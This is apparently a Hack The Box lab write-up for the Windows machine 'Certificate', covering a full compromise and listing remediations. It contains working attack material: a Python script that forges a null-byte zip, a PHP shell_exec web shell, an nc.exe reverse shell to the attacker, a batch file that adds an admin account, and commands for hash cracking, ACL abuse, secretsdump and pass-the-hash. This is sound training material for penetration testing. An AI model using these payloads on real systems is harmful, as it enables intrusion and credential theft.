---
title: HTB Certificate
slug: htb-certificate-writeup
type: writeup
category: htb
date: 2025-06-02
difficulty: hard
os: windows
readTime: 12 min read
points: 60
tags: [AD, WEB, WINDOWS]
classification: CLASSIFIED-WHITE
summary: Course portal quiz uploader into a `.php` shell via zip + null-byte trick, bcrypt crack, `GenericAll` pivot to `Ryan.K`, and `SeManageVolumePrivilege` → `diaghub` LOLBAS → Administrator NT hash.
engagement:
  platform: Hack The Box
  target: certificate.htb
  ref: 10.129.237.217
  start: 02:38 EDT
  duration: 12 min read
  operator: WDD-01
killchain:
  - { stage: UPLOAD,   sub: "zip + null byte",        tag: MIME,     color: warn }
  - { stage: FOOTHOLD, sub: "shell_exec bypass",      tag: XAMPP,    color: warn }
  - { stage: USER,     sub: "bcrypt to sara.b",       tag: HASHCAT,  color: warn }
  - { stage: PIVOT,    sub: "GenericAll to Ryan.K",   tag: BLOODYAD, color: warn }
  - { stage: SYSTEM,   sub: "diaghub + secretsdump",  tag: GOAL,     color: ok }
loadout:
  - { tool: nmap,       purpose: recon }
  - { tool: burp,       purpose: proxy }
  - { tool: python,     purpose: zip-forge }
  - { tool: netexec,    purpose: auth }
  - { tool: hashcat,    purpose: crack }
  - { tool: bloodhound, purpose: graph }
  - { tool: bloodyAD,   purpose: ace-flip }
  - { tool: impacket,   purpose: secretsdump }
  - { tool: evil-winrm, purpose: shell }
remediation:
  - Server-side file-type validation (magic bytes, not MIME or extension)
  - Disable XAMPP / PHP handlers for uploaded content paths
  - Strip `SeManageVolumePrivilege` from standard user accounts
  - Audit ACLs that grant ACCOUNT OPERATORS blanket `GenericAll` on user objects
---

::: stage n=1 label="UPLOAD" title="A course portal that trusts the MIME header."

Nmap paints a {red:certificate.htb} AD footprint: DNS, HTTP (Apache 2.4.58 on port 80), Kerberos on 88, LDAP on 389, SMB on 445. DC01 is the domain controller.

::: terminal title="shell · operator@kali" lang="bash"
$ nmap -A -T5 10.129.237.217 --min-rate 2000
53/tcp    open  domain    Simple DNS Plus
80/tcp    open  http      Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap      Microsoft Windows AD LDAP (Domain: certificate.htb)
445/tcp   open  microsoft-ds
:::

The web app is an online course platform. Registering as a {red:teacher} requires manual verification — a {red:student} account works instantly, and students can upload quiz submissions.

The upload validator allows `.pdf`, `.pptx`, `.xlsx`, and `.zip`. Trying a raw `.php` with a classic payload fails:

::: warn title="400 BAD REQUEST"
The request you sent contains bad or malicious content (Invalid MIME type).
:::

::: img src="../assets/img/writeups/htb-certificate/01-mime-error.png" caption="Upload validator rejects the raw .php — MIME check fires first"

The server checks {warn:MIME type}, not the extension alone.

:::

::: stage n=2 label="FOOTHOLD" title="Null byte + .zip rename into PHP execution."

The trick: wrap the payload in an allowed `.zip`, rename the inner file to `dump.php\x00.pdf`. PHP on Windows honors the null byte before the extension, Apache still routes `.php` to the handler.

::: terminal title="zip-forge · operator@kali" lang="python"
import os, zipfile

zip_path     = 'dump.zip'
new_zip_path = 'dump22.zip'
old_filename = 'dump.php'
new_filename = 'dump.php\x00.pdf'

with zipfile.ZipFile(zip_path, 'r') as zip_read:
    with zipfile.ZipFile(new_zip_path, 'w',
                         compression=zipfile.ZIP_DEFLATED) as zip_write:
        for item in zip_read.infolist():
            data = zip_read.read(item.filename)
            if item.filename == old_filename:
                item.filename = new_filename
            zip_write.writestr(item, data)
:::

`system()` is flagged by XAMPP's mod_security defaults. Switching to `shell_exec` slips past:

```php
<?php echo(shell_exec($_GET['cmd'])); ?>
```

::: terminal title="shell · shell.php · xamppuser" lang="bash"
GET /static/uploads/ebd0473a69a5f33d8a4caa3b1e4f234c/shell.php?cmd=whoami
certificate\xamppuser
:::

::: img src="../assets/img/writeups/htb-certificate/02-shell-whoami.png" caption="shell_exec bypass — whoami comes back certificate\\xamppuser"

Upgrade to a proper shell: Python HTTP server on the attacker, PowerShell IWR pulls `nc.exe`, then `shell.php?cmd=.\nc.exe 10.10.x.x 4444 -e cmd.exe` catches on the listener.

:::

::: stage n=3 label="USER" title="db.php reveals bcrypt dump. Crack to sara.b."

Hunting around `C:\xampp\htdocs\certificate.htb` turns up `db.php` — a PDO connection string with the `certificate_webapp_user` credentials for `Certificate_WEBAPP_DB`.

A one-liner `dump.php` runs `SELECT * FROM users` and prints every row to the browser. The table yields handles, emails, and a {red:$2y$04$...} bcrypt hash per user.

::: terminal title="shell · operator@kali" lang="bash"
$ hashcat -m 3200 -a 0 bcrypt_hashes.txt rockyou.txt
...
$2y$04$bZs2FUjVRiFswYB4CUR8ve02ymuiy0QD23X0KFuT6IM2sBbgQvEFG : [REDACTED]

$ nxc ldap certificate.htb -u sara.b -p '[REDACTED]'
LDAP  10.129.237.215  389  DC01  [+] certificate.htb\sara.b:[REDACTED]
$ nxc winrm certificate.htb -u sara.b -p '[REDACTED]'
WINRM 10.129.237.215 5985 DC01  [+] certificate.htb\sara.b:[REDACTED] (Pwn3d!)
:::

::: img src="../assets/img/writeups/htb-certificate/03-bcrypt-cracked.png" caption="NetExec confirms sara.b's creds and flags WinRM as Pwn3d!"

`sara.b` has WinRM, so `evil-winrm` lands the user shell and `user.txt`.

:::

::: stage n=4 label="PIVOT" title="BloodHound: ACCOUNT OPERATORS, GenericAll, Ryan.K."

`dir C:\Users\` lists local profiles: `akeder.kh`, `Lion.SK`, `Ryan.K`, `Sara.B`, `xamppuser`. `Ryan.K` is the next target.

::: terminal title="shell · sara.b@certificate.htb" lang="bash"
$ bloodhound-python -u sara.b -p '[REDACTED]' \
    -dc dc01.certificate.htb -d certificate.htb -c all -ns 10.10.x.x
INFO: Found 10 users, 59 groups, 1 computer
:::

BloodHound graph: SARA.B is a member of ACCOUNT OPERATORS, which has {warn:GenericAll} over RYAN.K. Flip the password directly:

::: img src="../assets/img/writeups/htb-certificate/04-bloodhound-genericall.png" caption="BloodHound — ACCOUNT OPERATORS → GenericAll → RYAN.K"

::: terminal title="shell · sara.b · bloodyAD" lang="bash"
$ bloodyAD -d certificate.htb -u sara.b -p '[REDACTED]' \
    --host 10.129.237.215 set password RYAN.K '[REDACTED]'
[+] Password changed successfully!
:::

`evil-winrm` back in as Ryan.K. `whoami /priv` shows the prize:

::: terminal title="shell · Ryan.K@certificate.htb" lang="powershell"
PS C:\Users\Ryan.K> whoami /priv
PRIVILEGES INFORMATION
Privilege Name                 Description                         State
SeMachineAccountPrivilege      Add workstations to domain          Enabled
SeManageVolumePrivilege        Perform volume maintenance tasks    Enabled
SeIncreaseWorkingSetPrivilege  Increase a process working set      Enabled
:::

{warn:SeManageVolumePrivilege} is the ticket.

:::

::: stage n=5 label="SYSTEM" title="SeManageVolumeAbuse and diaghub LOLBAS, to Administrator NT hash."

The privilege lets us change ACLs on any file. `xct/SeManageVolumeAbuse.exe C:\Windows\System32` opens the door, but `root.txt` itself is locked down by the box creator (some custom magic I couldn't unravel).

Plan B: LOLBAS `diaghub.exe` drops a payload into `System32\spool\drivers\color\` and executes as SYSTEM.

::: terminal title="shell · Ryan.K@certificate.htb" lang="powershell"
PS> .\SeManageVolumeAbuse.exe C:\Windows\System32
Success! Permissions changed.

PS> copy .\nc.bat C:\windows\system32\spool\drivers\color\nc.bat
PS> type C:\windows\system32\spool\drivers\color\nc.bat
net user moriz [REDACTED] /add
net localgroup Administrators moriz /add

PS> diaghub.exe C:\ProgramData xct.dll
[+] CoCreateInstance
[+] CreateSession
[+] Success
PS> net user
Administrator  akeder.kh  Alex.D
moriz          Nya.S      Ryan.K
:::

::: img src="../assets/img/writeups/htb-certificate/05-net-user.png" caption="moriz joins the Administrators group after diaghub fires as SYSTEM"

The new {ok:moriz} account is now in Administrators. `secretsdump.py` over the domain pops the Administrator NT hash:

::: terminal title="shell · moriz · impacket" lang="bash"
$ secretsdump.py 'certificate.htb/moriz:[REDACTED]@certificate.htb'
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NT HASH]:::
krbtgt:502:aad3b435...
...

$ evil-winrm -i 10.129.237.215 -u Administrator -H [NT HASH]
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
:::

{ok:NT AUTHORITY\SYSTEM}. Rooted.

::: opsec
The wild-goose chase on this box is a `WS-01_PktMon.pcap` under Sara.B's folder that cracks to `Lion.SK` — legitimate creds, WinRM access, no useful privileges. Don't burn an hour on it like I did.
:::

:::
